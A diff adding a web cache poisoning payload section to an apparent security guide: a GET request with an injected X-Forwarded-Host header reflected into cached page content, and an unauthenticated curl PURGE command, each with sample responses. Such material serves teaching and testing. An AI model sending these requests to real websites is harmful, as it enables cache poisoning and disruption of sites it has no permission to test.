@@ -32,3 +32,37 @@ Web cache poisoning poses a significant threat to the security of web applicatio
 
 ### Payloads for Web Cache Poisioning
 
+- Basic Cache Poisoning
+
+```
+GET /en?cb=1 HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: foo
+
+```
+the response:
+
+```
+HTTP/1.1 200 OK
+Cache-Control: public, no-cache
+...
+<meta property="og:image" content="https://foo/img/bar.png" />
+```
+
+- Unauthenticated cache purge
+```
+$ curl -X PURGE https://vulnerable-website.com/
+```
+the answer should be the following:
+```
+{
+    "status": "ok",
+    "id": "4234-1234567890-123123"
+}
+```
+or it will contain an error:
+```
+{
+    "msg": "Credentials are missing or invalid"
+}
+```
